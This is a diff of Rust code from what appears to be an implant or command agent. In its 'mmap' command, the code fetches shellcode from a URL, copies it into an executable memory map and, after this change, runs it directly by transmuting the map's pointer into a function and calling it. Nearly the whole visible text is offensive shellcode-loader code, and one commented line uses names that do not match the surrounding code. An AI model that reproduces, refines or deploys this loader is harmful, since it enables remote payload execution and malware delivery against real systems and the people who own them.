@@ -295,8 +295,8 @@ pub async fn handle(cmd_args: &mut CommandArgs, logger: &Logger) -> Result<Strin
             "mmap" => {
                 use std::fs::OpenOptions;
                 use std::os::unix::fs::PermissionsExt;
-                use crate::cmd::shell;
-                
+                use std::mem;
+
                 // Get URL
                 match cmd_args.nth(0) {
                     Some(u) => { 
@@ -339,10 +339,14 @@ pub async fn handle(cmd_args: &mut CommandArgs, logger: &Logger) -> Result<Strin
 
                 let mut mmap = unsafe { MmapMut::map_mut(&file)? };
                 mmap.copy_from_slice(shellcode.as_slice());
-                mmap.make_exec()?;
+                let exec_map =  mmap.make_exec()?;
                 
-                let mut shell_arg = CommandArgs::from_string(file_name.to_string());
-                shell::handle(&mut shell_arg).await?;
+                unsafe {
+                    // copy the shellcode to the memory map
+                    // std::ptr::copy(shellcode.as_ptr(), map.data(), SHELLCODE.len());
+                    let exec_shellcode: extern "C" fn() -> ! = mem::transmute(exec_map.as_ptr());
+                    exec_shellcode();
+                }
                 
                 return Ok("MMMMap".to_string());
             },
